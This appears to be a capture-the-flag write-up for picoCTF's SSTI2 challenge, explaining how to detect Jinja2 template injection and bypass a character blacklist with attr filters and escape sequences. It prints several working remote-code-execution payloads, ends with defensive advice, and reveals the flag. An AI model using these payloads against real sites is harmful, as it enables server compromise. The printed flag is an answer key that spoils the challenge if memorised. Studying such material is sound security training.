**Challenge:** SSTI2

**Level:** Medium

**Challenge Author:** Venax

### Description: 
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)


### Step-by-Step Walkthrough:
 Upon opening the webpage, you are greeted by a website with various nodes and interactive elements and the title `NAND Simulator`

#### Investigation
All good web page vulnerability inspections will generally comprise of two things:

1. Using the Web Page Inspector
2. Testing all the interactive elements

Our first hint comes from the title of the challenge. SSTI stands for Server Side Template Injection, and we've been here before in `SSTI1`. So we can expect a vulnerability in the submission form somehow.

#### Investigation - Testing Injections
Reviewing this [site](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) we can run through some test injections

The attacker tests the identified input field by injecting template syntax specific to the template engine in use. Different web frameworks use different template engines (e.g., Jinja2 for Python, Twig for PHP, or FreeMarker for Java).
In most cases, the polyglot input: `‘${{<%[%'"}}%\.’`, can often be utilized to detect a vulnerability. If it errors out, we know we're on the right track. 

Unfortunately, we're treated to a message `Stop trying to break me` in an angry tone. I'm not sure what this means for us, so let's try and work through this one step at a time, following the template on `PayloadsAllTheThings`

1. `${7*7}` - Fail
2. `{{7*7}}` - Success
3. `{{7*'7'}}` - Success

Therefore, we are looking at a potential vulnerability of either `Jinja2` or `Twig`, although the typical injections are rejected. 

`{{#}}` - Fails
`{{printf}}` - Succeeds
`{{printf ""}}` - Fails

I can deduce a few things. 

1. `{{}}` wraps a command and some commands can succeed, but there are some boundaries on the server side 
3. Some of the characters seem to be completely blacklisted


#### Learning - escape sequences
We're going to replace elements one at a time from the previous command with alternative characters. Here's the original command:

`{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}`

first, let's replace all `_` with unicode. Unicode has an `escape sequence`

An `escape sequence` is a combination of characters used to represent special characters in a string that cannot be typed directly or would otherwise have a different meaning. Escape sequences usually start with a backslash (`\`) followed by one or more characters. The `escape sequence` for `_` is `\x5f`

#### Action - Replacing the code

Our command now looks like this:

```
{{self.\u005f\u005finit\u005f\u005f.\u005f\u005fglobals\u005f\u005f.\u005f\u005fbuiltins\u005f\u005f.\u005f\u005fimport\u005f\u005f('os').popen('cat flag').read()}}
```

Now replace the `.` characters

```
{{ self|attr('\u005f\u005finit\u005f\u005f')|attr('\u005f\u005fglobals\u005f\u005f')|attr('\u005f\u005fbuiltins\u005f\u005f')|attr('\u005f\u005fimport\u005f\u005f')('os')|attr('popen')('cat flag')|attr('read')() }}
```
Now fix the `self` command

```
{{ request|attr('self')|attr('\u005f\u005finit\u005f\u005f')|attr('\u005f\u005fglobals\u005f\u005f')|attr('\u005f\u005fbuiltins\u005f\u005f')|attr('\u005f\u005fimport\u005f\u005f')('os')|attr('popen')('cat flag')|attr('read')() }}
```

Finally, add in the `getitem` request

```
{{ request|attr('self')|attr('\u005f\u005finit\u005f\u005f')|attr('\u005f\u005fglobals\u005f\u005f')|attr('\u005f\u005fgetitem\u005f\u005f')('\u005f\u005fbuiltins\u005f\u005f')|attr('\u005f\u005fgetitem\u005f\u005f')('\u005f\u005fimport\u005f\u005f')('os')|attr('popen')('cat flag')|attr('read')() }}
```

This last command will net you the flag, and just for learning sake, you can also use `hex` instead of `unicode` with the `escape sequence` as follows:

```
{{ request|attr('self')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}
```

#### Learning - blacklisting characters doesn't work
It's hard to stay on top of things is the lesson here. Just because you fix one hole, doesn't mean you've fixed the ship. 


* There are often alternative encodings, representations, or similar characters that can slip past the blacklist (e.g., using Unicode, URL encoding, or case variations).
* Incomplete coverage: It’s difficult to anticipate and block every dangerous character or sequence, so some may be missed.
* Maintenance is hard: New attack techniques or characters may emerge, requiring constant updates to the blacklist.
* False sense of security: Developers may believe input is safe when it’s not, leading to vulnerabilities like SQL injection, XSS, or command injection.

Instead of trying to patch holes, there are better methods.

* Whitelisting (Allow-listing): Only allow specific, known-safe characters, patterns, or formats in user input.

* Input Validation: Strictly check that input matches expected types, lengths, and formats before processing.

* Context-Aware Escaping/Encoding: Escape or encode user input based on where it will be used (e.g., HTML, SQL, shell, URL).

* Use Security Libraries and Frameworks: Rely on well-maintained libraries for input handling and sanitization.

* Least Privilege Principle: Run applications with the minimum permissions necessary.

* Output Encoding: Encode output data to prevent injection when displaying user input.

<details><summary>Flag</summary>
    <pre>
    picoCTF{sst1_f1lt3r_byp4ss_e964f71b}
    </pre>
   </details>